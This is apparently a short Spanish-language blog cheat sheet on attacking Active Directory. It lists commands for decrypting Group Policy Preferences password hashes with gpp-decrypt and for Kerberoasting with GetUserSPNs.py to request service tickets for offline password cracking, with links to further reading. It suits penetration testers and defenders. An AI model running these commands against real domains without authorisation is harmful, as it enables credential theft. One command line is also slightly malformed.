---
layout: post
title: Active Directory CheetSheat
subtitle: Active Direcroty CheetSheat
tags: [windows, AD]
description: Active Directory CheetSheat
---


## Preferencias de directivas de grupo

- Windows Server 2008

### Gpp-Descifrar
 
```
gpp-decrypt <hash>
```

Más información:  
[https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/](https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)  
[https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)

-----

## kerberoasting attack

**Kerberoasting** es una técnica que permite a un atacante robar el `ticket KRB_TGS`, que está encriptado con RC4, para aplicar el hash de los servicios de aplicación de fuerza bruta para extraer su contraseña.

> Kerberos es para autenticación, no para autorización, esta laguna permite el kerberoasting

```
GetUserSPNs.py <dominio>/<user>:<password>
```

### Obtener el TGS

 ```
 GetUserSPNs.py <dominio>/<user>:<password -request
 ```
 
Más información:
[https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/](https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/)


